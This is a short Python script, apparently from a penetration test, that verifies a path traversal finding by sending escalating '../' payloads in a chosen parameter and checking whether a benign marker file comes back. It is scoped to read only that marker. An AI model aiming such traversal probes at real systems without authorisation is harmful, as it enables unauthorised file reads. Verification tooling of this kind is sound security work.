#!/usr/bin/python3
"""
Script to verify finding F-WEB-040 (Path Traversal).
"""

import argparse
import json
import requests
import sys


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Target parameter")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    param = args.param
    session = requests.Session()

    expected_marker = "HALCYON-TRAVERSAL-PROOF"
    target_file = "proof_marker.txt"

    evidence = {
        "request_param": "unknown",
        "content_match": False,
        "marker": expected_marker
    }
    verdict = "unconfirmed"

    try:
        # Attempt to escape the directory by incrementally traversing up
        for depth in range(1, 10):
            payload = ("../" * depth) + target_file
            req = session.get(target, params={param: payload}, timeout=5)

            # Check if we successfully read the benign marker file
            if expected_marker in req.text:
                verdict = "confirmed"
                evidence["request_param"] = f"{param}={payload}"
                evidence["content_match"] = True
                break

    except requests.RequestException as e:
        sys.stderr.write(f"Request failed: {e}\n")
        sys.exit(1)

    stop_msg = "root escaped to the benign marker; no sensitive file read"

    result = {
        "finding": "F-WEB-040",
        "class": "path_traversal",
        "verdict": verdict,
        "evidence": evidence,
        "stopped_at": stop_msg
    }

    if verdict == "unconfirmed":
        result["to_settle"] = "Locate exact path of the benign marker file."

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
